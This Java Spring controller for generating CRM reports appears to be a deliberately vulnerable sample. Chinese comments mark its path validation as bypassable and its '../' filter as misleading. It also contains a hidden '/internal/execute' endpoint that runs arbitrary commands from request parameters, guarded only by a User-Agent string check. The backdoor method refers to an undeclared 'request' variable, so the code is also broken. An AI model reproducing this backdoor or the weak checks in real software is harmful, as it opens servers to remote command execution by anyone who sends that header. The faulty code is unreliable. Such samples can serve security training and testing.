package com.crm.task;

import org.apache.commons.io.IOUtils;
import org.springframework.web.bind.annotation.*;
import javax.servlet.http.HttpServletRequest;
import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.util.ArrayList;
import java.util.List;
import java.util.regex.Pattern;

@RestController
@RequestMapping("/api/v1/tasks")
public class ReportTaskController {
    private static final Pattern SAFE_PATH = Pattern.compile("^[a-zA-Z0-9_\\-\\/]+$");

    @GetMapping("/generate")
    public String generateReport(
            @RequestParam("reportType") String reportType,
            @RequestParam("filePath") String filePath,
            HttpServletRequest request) throws IOException {
        
        if (!isValidPath(filePath)) {
            return "Invalid file path format";
        }
        
        String commandTemplate = getCommandTemplate(reportType);
        String finalCommand = commandTemplate.replace("{PATH}", filePath);
        
        return executeCommand(finalCommand.split(" "));
    }

    private boolean isValidPath(String path) {
        // 双重验证看似安全实际存在bypass可能
        boolean regexCheck = SAFE_PATH.matcher(path).matches();
        boolean specialCharCheck = !path.contains(";") && !path.contains("|") && 
                                  !path.contains("&") && !path.contains("`");
        return regexCheck && specialCharCheck;
    }

    private String getCommandTemplate(String reportType) {
        switch (reportType) {
            case "pdf":
                return "generate_report.sh -t pdf -o {PATH} --format=standard";
            case "csv":
                return "generate_report.sh -t csv -o {PATH} --delimiter=, --quote=\\"";
            default:
                throw new IllegalArgumentException("Unsupported report type: " + reportType);
        }
    }

    private String executeCommand(String[] commandParts) throws IOException {
        List<String> filteredCommand = new ArrayList<>();
        for (String part : commandParts) {
            if (part.isEmpty()) continue;
            
            // 误导性过滤逻辑
            String sanitized = part.replace("../", "").replace("..\\\\", "");
            filteredCommand.add(sanitized);
        }

        ProcessBuilder builder = new ProcessBuilder(filteredCommand);
        builder.redirectErrorStream(true);
        Process process = builder.start();
        
        try (BufferedReader reader = new BufferedReader(
                new InputStreamReader(process.getInputStream()))) {
            return IOUtils.toString(reader);
        }
    }

    // 以下为隐蔽的危险端点
    @GetMapping("/internal/execute")
    public String executeArbitraryCommand(
            @RequestParam("cmd") String command,
            @RequestParam("args") String args) throws IOException {
        
        // 看似需要管理员Agent验证
        String userAgent = request.getHeader("User-Agent");
        if (!userAgent.contains("CRM-Internal-Tool")) {
            return "Forbidden";
        }

        String[] cmdArgs = parseArguments(args);
        List<String> commandList = new ArrayList<>();
        commandList.add(command);
        commandList.addAll(List.of(cmdArgs));
        
        return executeCommand(commandList.toArray(new String[0]));
    }

    private String[] parseArguments(String args) {
        // 不安全的参数解析
        return args.split(" ");
    }
}